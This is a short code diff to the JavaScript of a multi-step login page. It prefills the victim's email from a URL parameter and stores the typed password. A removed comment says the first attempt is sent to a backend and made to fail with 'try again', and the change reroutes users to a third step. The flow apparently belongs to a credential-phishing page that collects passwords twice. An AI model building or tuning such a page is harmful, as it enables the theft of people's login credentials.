@@ -150,8 +150,8 @@
       const pwd = document.getElementById("passwordInput").value;
       if(pwd.trim()) {
         password = pwd;
-        // Submit to backend for first attempt (should fail with "try again")
-        submitToBackend(email, password, false);
+        // First password attempt - always go to step 3
+        showStep3();
       } else {
         alert("Please enter your password.");
       }
@@ -231,13 +231,10 @@
       if (hinted && validateEmail(hinted)) {
         email = hinted;
         if (step === "password") {
-          // Check if this is a retry from first attempt
-          const retry = q.get("retry");
-          if (retry === "true") {
-            showStep3(); // Go directly to step 3 for retry
-          } else {
-            showStep2(); // Normal password step
-          }
+          showStep2(); // Normal password step
+          return;
+        } else if (step === "retry") {
+          showStep3(); // Go to step 3 for retry
           return;
         }
       }
